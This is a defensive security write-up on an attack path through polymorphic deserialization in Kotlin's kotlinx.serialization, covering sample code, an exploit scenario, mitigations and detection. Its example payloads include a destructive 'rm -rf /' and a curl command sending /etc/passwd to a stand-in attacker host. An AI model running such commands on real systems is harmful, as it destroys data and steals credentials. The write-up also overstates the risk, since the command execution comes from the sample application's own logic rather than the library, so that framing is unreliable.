# Deep Analysis of Attack Tree Path: 1.1.1.3 Trigger Deserialization of Crafted Input

## 1. Objective

The primary objective of this deep analysis is to thoroughly investigate the attack path "1.1.1.3. Trigger Deserialization of Crafted Input" within the context of an application utilizing the `kotlinx.serialization` library.  This involves understanding how an attacker could exploit vulnerabilities related to polymorphic deserialization to achieve arbitrary code execution.  We aim to identify specific code patterns, configurations, and input vectors that could lead to this critical vulnerability.  The ultimate goal is to provide actionable recommendations for the development team to mitigate this risk.

## 2. Scope

This analysis focuses specifically on the following:

*   **Target Library:** `kotlinx.serialization` (all versions, with particular attention to known vulnerable patterns).
*   **Attack Vector:**  Triggering deserialization of attacker-controlled input that exploits polymorphic type handling.
*   **Application Context:**  We assume a generic application that uses `kotlinx.serialization` for data serialization and deserialization, potentially across network boundaries (e.g., a REST API) or within internal data processing pipelines.  We will consider various input methods (API endpoints, form fields, message queues, etc.).
*   **Exclusions:**  This analysis *does not* cover other potential attack vectors against the application, such as SQL injection, cross-site scripting, or vulnerabilities in other libraries.  It also does not cover denial-of-service attacks that do not involve code execution via deserialization.

### 4.1. Understanding Polymorphic Deserialization in `kotlinx.serialization`

`kotlinx.serialization` supports polymorphism, allowing serialization and deserialization of objects belonging to a class hierarchy.  This is typically achieved using sealed classes or interfaces, along with the `@Serializable` annotation and, crucially, the `@SerialName` annotation to distinguish between different subtypes.  The core vulnerability arises when the deserializer uses type information *provided in the serialized data* to determine the class to instantiate.

**Example (Vulnerable Code Pattern):**

```kotlin
import kotlinx.serialization.*
import kotlinx.serialization.json.*

@Serializable
sealed class Message {
    abstract val content: String
}

@Serializable
@SerialName("text")
data class TextMessage(override val content: String) : Message()

@Serializable
@SerialName("command") //Potentially dangerous
data class CommandMessage(override val content: String, val command: String) : Message()

fun processMessage(jsonString: String) {
    val message = Json.decodeFromString<Message>(jsonString) //Vulnerable line
    println("Received message: $message")
    //Potentially dangerous action based on message type
    if (message is CommandMessage) {
        executeCommand(message.command) //Extremely dangerous
    }
}

fun executeCommand(command: String) {
    //Simulate command execution (in a real scenario, this could be Runtime.exec)
    println("Executing command: $command")
}

fun main() {
    val safeJson = """{"type":"text","content":"Hello"}"""
    processMessage(safeJson)

    val maliciousJson = """{"type":"command","content":"Exploit","command":"rm -rf /"}""" //Malicious payload
    processMessage(maliciousJson)
}
```

**Explanation of Vulnerability:**

*   The `Json.decodeFromString<Message>(jsonString)` line is the critical point.  The `Json` object, by default, uses the `"type"` field in the JSON to determine which subclass of `Message` to instantiate.
*   An attacker can craft a malicious JSON payload, like `maliciousJson`, specifying `"type":"command"`.  This forces the deserializer to create a `CommandMessage` instance.
*   The subsequent code (the `if` block and `executeCommand` function) then executes the attacker-supplied command, leading to arbitrary code execution.

### 4.2. Input Vectors

Several input vectors could be used to deliver the malicious JSON payload:

*   **API Endpoints:**  If the `processMessage` function is part of a REST API endpoint that accepts JSON input, an attacker could send a POST or PUT request with the malicious payload.
*   **Form Fields:**  If a web form uses `kotlinx.serialization` to serialize data before sending it to the server, an attacker could manipulate the form data (e.g., using browser developer tools) to inject the malicious JSON.
*   **Message Queues:**  If the application uses a message queue (e.g., Kafka, RabbitMQ) and messages are serialized using `kotlinx.serialization`, an attacker who can inject messages into the queue could send a malicious message.
*   **File Uploads:**  If the application accepts file uploads and deserializes the file content using `kotlinx.serialization`, an attacker could upload a file containing the malicious JSON.
*   **Database Fields:** If serialized data is stored in a database and later deserialized, an attacker who can compromise the database (e.g., via SQL injection) could modify the stored data to include the malicious payload.
* **Configuration Files:** If application uses configuration files that are deserialized, attacker can modify this file.

### 4.3. Exploit Scenario

1.  **Target Identification:** The attacker identifies an API endpoint `/api/processMessage` that accepts JSON data.  They suspect it uses `kotlinx.serialization` based on error messages or library fingerprinting.
2.  **Payload Crafting:** The attacker crafts the malicious JSON payload: `{"type":"command","content":"Exploit","command":"<malicious_command>"}`.  The `<malicious_command>` could be anything from exfiltrating data (`curl http://attacker.com/exfiltrate?data=$(cat /etc/passwd)`) to installing malware.
3.  **Payload Delivery:** The attacker sends a POST request to `/api/processMessage` with the crafted JSON payload in the request body.
4.  **Deserialization and Execution:** The server receives the request, and the `Json.decodeFromString<Message>(jsonString)` line deserializes the payload, creating a `CommandMessage` instance.  The application then executes the attacker's command.
5.  **Impact:** The attacker achieves arbitrary code execution on the server, potentially gaining full control of the system.

### 4.4. Mitigation Recommendations

1.  **Avoid Default Polymorphic Deserialization:**  The most crucial mitigation is to *avoid relying on the default polymorphic deserialization behavior* that uses type information from the input.  Instead, use one of the following safer approaches:

    *   **Explicit Deserialization:**  Instead of deserializing to the base class (`Message`), deserialize to a specific subclass *if you know the expected type*.  For example:

        ```kotlin
        //If you expect a TextMessage:
        val message = Json.decodeFromString<TextMessage>(jsonString)
        ```

    *   **Custom Serializers:**  Define custom serializers for your sealed classes or interfaces.  This gives you complete control over the deserialization process and allows you to implement robust validation and type checking.  This is the recommended approach for complex hierarchies.

        ```kotlin
        @Serializer(forClass = Message::class)
        object MessageSerializer : KSerializer<Message> {
            override fun deserialize(decoder: Decoder): Message {
                val input = decoder.decodeSerializableValue(JsonObject.serializer())
                return when (val type = input["type"]?.jsonPrimitive?.content) {
                    "text" -> Json.decodeFromJsonElement(TextMessage.serializer(), input)
                    "command" -> {
                        //Option 1: Throw an exception (recommended)
                        throw SerializationException("CommandMessage is not allowed")
                        //Option 2: Log and return a safe default (less secure)
                        //log.warn("Attempt to deserialize CommandMessage")
                        //TextMessage("Invalid message type")
                    }
                    else -> throw SerializationException("Unknown message type: $type")
                }
            }

            override fun serialize(encoder: Encoder, value: Message) {
                when (value) {
                    is TextMessage -> encoder.encodeSerializableValue(TextMessage.serializer(), value)
                    is CommandMessage -> encoder.encodeSerializableValue(CommandMessage.serializer(), value)
                }
            }
        }

        //Then, annotate your sealed class:
        @Serializable(with = MessageSerializer::class)
        sealed class Message { ... }
        ```

    *   **`SerializersModule` and `classDiscriminator`:** Use a `SerializersModule` to explicitly register subtypes and potentially change the `classDiscriminator` (default is `"type"`) to a less predictable value.  This makes it harder for an attacker to guess the correct discriminator.  However, this is *not a complete solution* on its own, as an attacker who can control the entire input can still provide the correct discriminator.

        ```kotlin
        val module = SerializersModule {
            polymorphic(Message::class) {
                subclass(TextMessage::class)
                subclass(CommandMessage::class) // Still vulnerable if CommandMessage is allowed
            }
        }

        val json = Json {
            serializersModule = module
            classDiscriminator = "_my_custom_type_" // Less predictable
        }
        ```
        **Important:** Even with `SerializersModule`, you *must* still validate the deserialized type and *never* blindly trust or execute data from untrusted sources.  The best practice is to combine `SerializersModule` with custom deserialization logic (as shown in the `MessageSerializer` example) to explicitly allow or deny specific subtypes.

2.  **Input Validation:**  Implement strict input validation *before* deserialization.  This should include:

    *   **Whitelist Allowed Types:**  If possible, maintain a whitelist of allowed message types and reject any input that doesn't match.
    *   **Schema Validation:**  Use a schema validation library (e.g., JSON Schema) to enforce a strict structure on the incoming JSON, preventing unexpected fields or types.
    *   **Length Limits:**  Enforce reasonable length limits on all input fields to prevent buffer overflows or other memory-related issues.
    *   **Character Restrictions:**  Restrict the allowed characters in input fields to prevent injection of special characters or control codes.

3.  **Principle of Least Privilege:**  Ensure that the application runs with the minimum necessary privileges.  This limits the damage an attacker can do even if they achieve code execution.  Avoid running the application as root or with administrative privileges.

4.  **Security Audits and Code Reviews:**  Regularly conduct security audits and code reviews, focusing on areas where `kotlinx.serialization` is used, especially with polymorphic types.

5.  **Dependency Management:** Keep `kotlinx.serialization` and all other dependencies up to date to benefit from the latest security patches.

6. **Avoid dangerous operations:** Never execute commands, eval code, or perform other dangerous operations based on deserialized data without thorough sanitization and validation.

### 4.5. Detection Strategy

1.  **Static Analysis:**
    *   Use static analysis tools (e.g., IntelliJ IDEA's built-in inspections, or dedicated security analysis tools) to identify potentially vulnerable code patterns, such as:
        *   Deserialization to a polymorphic base class without a custom serializer.
        *   Use of `Json.decodeFromString<BaseClass>(...)` where `BaseClass` is a sealed class or interface.
        *   Lack of input validation before deserialization.
    *   Create custom static analysis rules to specifically flag the use of default polymorphic deserialization with `kotlinx.serialization`.

2.  **Runtime Monitoring:**
    *   **Logging:** Log all deserialization attempts, including the input data, the expected type, and the actual deserialized type.  This can help identify suspicious activity.
    *   **Intrusion Detection Systems (IDS):** Configure IDS rules to detect attempts to inject malicious JSON payloads, such as those containing unexpected type discriminators or known exploit patterns.
    *   **Security Information and Event Management (SIEM):**  Aggregate logs from various sources (application logs, IDS logs, etc.) into a SIEM system to correlate events and identify potential attacks.
    * **Custom Deserialization Hooks:** If possible, implement custom hooks within the deserialization process to monitor the types being instantiated and raise alerts if unexpected types are encountered. This would require modifying or extending the `kotlinx.serialization` library, which might not always be feasible.

3.  **Fuzzing:** Use fuzzing techniques to test the application's resilience to malformed or unexpected input.  Fuzzers can generate a large number of variations of input data, including those that might trigger deserialization vulnerabilities.

4. **Penetration Testing:** Engage in regular penetration testing by security professionals to identify and exploit vulnerabilities, including those related to deserialization.

## 5. Conclusion

The attack path "1.1.1.3. Trigger Deserialization of Crafted Input" represents a significant security risk in applications using `kotlinx.serialization` with polymorphic types.  By understanding the underlying vulnerability, potential input vectors, and exploit scenarios, developers can take proactive steps to mitigate this risk.  The most effective mitigation is to avoid default polymorphic deserialization and instead use custom serializers or explicit deserialization to specific subtypes, combined with rigorous input validation and the principle of least privilege.  Regular security audits, code reviews, and runtime monitoring are essential for detecting and preventing exploitation attempts.
